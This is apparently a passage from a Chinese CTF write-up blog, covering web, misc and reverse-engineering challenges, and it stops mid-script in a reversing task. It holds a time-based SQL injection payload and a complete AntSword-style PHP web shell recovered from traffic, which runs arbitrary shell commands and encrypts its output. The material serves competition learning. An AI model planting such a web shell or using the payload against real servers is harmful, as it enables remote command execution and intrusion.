+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;?src&#x3D;&amp;age&#x3D;1%20or%20if(1&#x3D;1,sleep(1),10) HTTP&#x2F;1.1</span><br><span class="line">Host: 111.186.57.43:10601</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64)	 AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;78.0.3904.108 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 5</span><br><span class="line">Content-Length: 5</span><br><span class="line"></span><br><span class="line">num&#x3D;1</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="misc2"><a href="#misc2" class="headerlink" title="misc2"></a>misc2</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">secret = open(<span class="string">'/flag'</span>, <span class="string">'rb'</span>)</span><br><span class="line">os.remove(<span class="string">'/flag'</span>)</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">'015b9efef8f51c00bcba57ca8c56d77a'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/r", methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">r</span><span class="params">()</span>:</span></span><br><span class="line">    data = request.form[<span class="string">"data"</span>]</span><br><span class="line">    <span class="keyword">if</span> os.path.exists(data):</span><br><span class="line">        <span class="keyword">return</span> open(data).read()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, port=<span class="number">8000</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
+
+<p>文件描述符里翻到了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;111.186.57.61:10701&#x2F;r</span><br><span class="line">data&#x3D;&#x2F;dev&#x2F;fd&#x2F;3</span><br><span class="line"></span><br><span class="line"># flag&#123;2315341f040f45ed02d8315f0a0b28f9&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="misc3"><a href="#misc3" class="headerlink" title="misc3"></a>misc3</h4><p>下载后打开，有一段。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;#8203;</span><br></pre></td></tr></table></figure>
+
+<p><strong>zwnj</strong>改为<strong>0</strong>以及<strong>#8203</strong>改为<strong>1</strong>，转字符串。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">res = <span class="string">"&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;zwnj;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;#8203;"</span>.replace(<span class="string">'&amp;zwnj;'</span>, <span class="string">'0'</span>).replace(<span class="string">'&amp;#8203;'</span>, <span class="string">'1'</span>)</span><br><span class="line"><span class="keyword">print</span> str(hex(int(res, <span class="number">2</span>)))[<span class="number">2</span>:<span class="number">-1</span>].decode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;e2a9c8b1175e66cf21f8593bc85bf939&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h4><p>流量分析，得到后门。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">@ini_set(<span class="string">"display_errors"</span>, <span class="string">"0"</span>);</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asenc</span><span class="params">($out)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    @session_start();</span><br><span class="line">    $key = <span class="string">'f5045b05abe6ec9b1e37fafa851f5de9'</span>;</span><br><span class="line">    <span class="keyword">return</span> @base64_encode(openssl_encrypt(base64_encode($out), <span class="string">'AES-128-ECB'</span>, $key, OPENSSL_RAW_DATA));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asoutput</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $output = ob_get_contents();</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"0897d"</span>;</span><br><span class="line">    <span class="keyword">echo</span> @asenc($output);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"60c97"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ob_start();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    $p = base64_decode($_POST[<span class="string">"0xc461e86196f1a"</span>]);</span><br><span class="line">    $s = base64_decode($_POST[<span class="string">"0x9ec3fa98a283f"</span>]);</span><br><span class="line">    $d = dirname($_SERVER[<span class="string">"SCRIPT_FILENAME"</span>]);</span><br><span class="line">    $c = substr($d, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">"/"</span> ? <span class="string">"-c \"&#123;$s&#125;\""</span> : <span class="string">"/c \"&#123;$s&#125;\""</span>;</span><br><span class="line">    $r = <span class="string">"&#123;$p&#125; &#123;$c&#125;"</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fe</span><span class="params">($f)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $d = explode(<span class="string">","</span>, @ini_get(<span class="string">"disable_functions"</span>));</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($d)) &#123;</span><br><span class="line">            $d = <span class="keyword">array</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $d = array_map(<span class="string">'trim'</span>, array_map(<span class="string">'strtolower'</span>, $d));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (function_exists($f) &amp;&amp; is_callable($f) &amp;&amp; !in_array($f, $d));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">runcmd</span><span class="params">($c)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ret = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (fe(<span class="string">'system'</span>)) &#123;</span><br><span class="line">            @system($c, $ret);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (fe(<span class="string">'passthru'</span>)) &#123;</span><br><span class="line">            @passthru($c, $ret);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (fe(<span class="string">'shell_exec'</span>)) &#123;</span><br><span class="line">            <span class="keyword">print</span>(@shell_exec($c));</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (fe(<span class="string">'exec'</span>)) &#123;</span><br><span class="line">            @exec($c, $o, $ret);</span><br><span class="line">            <span class="keyword">print</span>(join(<span class="string">"</span></span><br><span class="line"><span class="string">"</span>, $o));</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (fe(<span class="string">'popen'</span>)) &#123;</span><br><span class="line">            $fp = @popen($c, <span class="string">'r'</span>);</span><br><span class="line">            <span class="keyword">while</span> (!@feof($fp)) &#123;</span><br><span class="line">                <span class="keyword">print</span>(@fgets($fp, <span class="number">2048</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            @pclose($fp);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (fe(<span class="string">'antsystem'</span>)) &#123;</span><br><span class="line">            @antsystem($c);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $ret = <span class="number">127</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ;</span><br><span class="line">    $ret = @runcmd($r . <span class="string">" 2&gt;&amp;1"</span>);</span><br><span class="line">    <span class="keyword">print</span> ($ret != <span class="number">0</span>) ? <span class="string">"ret=&#123;$ret&#125;"</span> : <span class="string">""</span>;;</span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"ERROR://"</span> . $e-&gt;getMessage();</span><br><span class="line">&#125;;</span><br><span class="line">asoutput();</span><br><span class="line"><span class="keyword">die</span>();</span><br></pre></td></tr></table></figure>
+
+<p>然后解出<strong>aes</strong>加密后的数据。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deenc</span><span class="params">($out)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    @session_start();</span><br><span class="line">    $key = <span class="string">'f5045b05abe6ec9b1e37fafa851f5de9'</span>;</span><br><span class="line">    <span class="keyword">return</span> @base64_decode(openssl_decrypt(base64_decode($out), <span class="string">'AES-128-ECB'</span>, $key, OPENSSL_RAW_DATA));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$enc = <span class="string">"kRD1eD+vSZ81FAJ6XClabCR0xNFklup5/x+gixas3l0kdMTRZJbqef8foIsWrN5dJHTE0WSW6nn/H6CLFqzeXSR0xNFklup5/x+gixas3l0kdMTRZJbqef8foIsWrN5dZOTFg4DW9MYwG6k3rEvAAR8oFStGnfMRtUJOqc0mgokfKBUrRp3zEbVCTqnNJoKJHygVK0ad8xG1Qk6pzSaCiR8oFStGnfMRtUJOqc0mgokfKBUrRp3zEbVCTqnNJoKJ1qI47Cz1/qfnNoNARGhLfVhC0RJlfeKCvbPwpjFn//BSFY8RJlZyxz1a+TPy0D3cUhWPESZWcsc9Wvkz8tA93FIVjxEmVnLHPVr5M/LQPdxSFY8RJlZyxz1a+TPy0D3cUhWPESZWcsc9Wvkz8tA93GnMvJfVbvphfWnt17IOkzYjvv91k2fnYDR7u4nlGM3YitxGYGs9mn+HS5iJBXORtYrcRmBrPZp/h0uYiQVzkbWK3EZgaz2af4dLmIkFc5G1itxGYGs9mn+HS5iJBXORtUq4dBjDRFhDqDyzs9CScJhrd3yMusQ+qsnZkq4Ey7NVJHTE0WSW6nn/H6CLFqzeXSR0xNFklup5/x+gixas3l0kdMTRZJbqef8foIsWrN5dJHTE0WSW6nn/H6CLFqzeXSR0xNFklup5/x+gixas3l2hDPuDhVN4TaDLzp9bXyfGeCVhvglAaNo2rA/ovnRTTtfA5ZywMOOijj6md5RItqjXwOWcsDDjoo4+pneUSLao18DlnLAw46KOPqZ3lEi2qNfA5ZywMOOijj6md5RItqgS0b9hS7r5TX9YNZo2awgUAyqVacVgwr1NlNQ2k/kihhh0QQfnjeGdZhkz0N0jAKiMzFmAMa7xQ1URxTaHoHjDg3NaWl/8+PVG+pyaKrbNDjfl77POeQE8+0MCHpz6YxWLJ6mwCe1X3uzz/HSHcHSvQBB8FxjOhugOErOXkd3LZi/60Gr4gIEc1JIxA5A2pE/V6Z/DFwNOR4M/IIIWdGr5"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> deenc($enc);</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;AntSword_is_Powerful_3222222!!!!&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="twocats"><a href="#twocats" class="headerlink" title="twocats"></a>twocats</h4><p>盲水印，随便找个脚本解得。</p>
+<h3 id="Reserve"><a href="#Reserve" class="headerlink" title="Reserve"></a>Reserve</h3><h4 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">bi = [<span class="number">0xAB</span>, <span class="number">0xB3</span>, <span class="number">0x01</span>, <span class="number">0xEE</span>, <span class="number">0x11</span>, <span class="number">0x07</span>, <span class="number">0x15</span>, <span class="number">0x6D</span>, <span class="number">0x5F</span>, <span class="number">0x93</span>, <span class="number">0x15</span>, <span class="number">0x25</span>, <span class="number">0x5C</span>, <span class="number">0x5A</span>, <span class="number">0x69</span>, <span class="number">0x78</span>, <span class="number">0xFF</span>, <span class="number">0xE1</span>, <span class="number">0x5F</span>,</span><br><span class="line">      <span class="number">0xD7</span>, <span class="number">0x25</span>, <span class="number">0x10</span>, <span class="number">0x13</span>, <span class="number">0x71</span>, <span class="number">0x74</span>, <span class="number">0xBF</span>, <span class="number">0x19</span>, <span class="number">0x16</span>, <span class="number">0x5F</span>, <span class="number">0x5E</span>, <span class="number">0x30</span>, <span class="number">0x7F</span>]</span><br><span class="line">bi = bi[<span class="number">16</span>:]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(bi) / <span class="number">2</span>):</span><br><span class="line">    temp = bi[i]</span><br><span class="line">    bi[i] = bi[<span class="number">16</span> - i - <span class="number">1</span>]</span><br><span class="line">    bi[<span class="number">16</span> - i - <span class="number">1</span>] = temp</span><br><span class="line"></span><br><span class="line">key = [<span class="number">0x15</span>, <span class="number">0xE3</span>, <span class="number">0xF5</span>, <span class="number">0xCA</span>, <span class="number">0x31</span>, <span class="number">0x99</span>, <span class="number">0xA8</span>, <span class="number">0x72</span>, <span class="number">0x01</span>, <span class="number">0x62</span>, <span class="number">0xD1</span>, <span class="number">0x8F</span>, <span class="number">0x37</span>, <span class="number">0x1D</span>, <span class="number">0x92</span>, <span class="number">0xCB</span>, <span class="number">0x5F</span>, <span class="number">0x44</span>, <span class="number">0x10</span>,</span><br><span class="line">       <span class="number">0xD9</span>, <span class="number">0x45</span>, <span class="number">0x79</span>, <span class="number">0x52</span>, <span class="number">0xC1</span>, <span class="number">0x9E</span>, <span class="number">0xFA</span>, <span class="number">0x50</span>, <span class="number">0xE1</span>, <span class="number">0x5D</span>, <span class="number">0xCF</span>, <span class="number">0x58</span>, <span class="number">0x9D</span>, <span class="number">0xB2</span>, <span class="number">0xC0</span>, <span class="number">0x55</span>, <span class="number">0xB8</span>, <span class="number">0x63</span>, <span class="number">0xF6</span>,</span><br><span class="line">       <span class="number">0x6F</span>, <span class="number">0xEA</span>, <span class="number">0xCE</span>, <span class="number">0x68</span>, <span class="number">0x0C</span>, <span class="number">0xFF</span>, <span class="number">0x59</span>, <span class="number">0x43</span>, <span class="number">0x6A</span>, <span class="number">0x02</span>, <span class="number">0x65</span>, <span 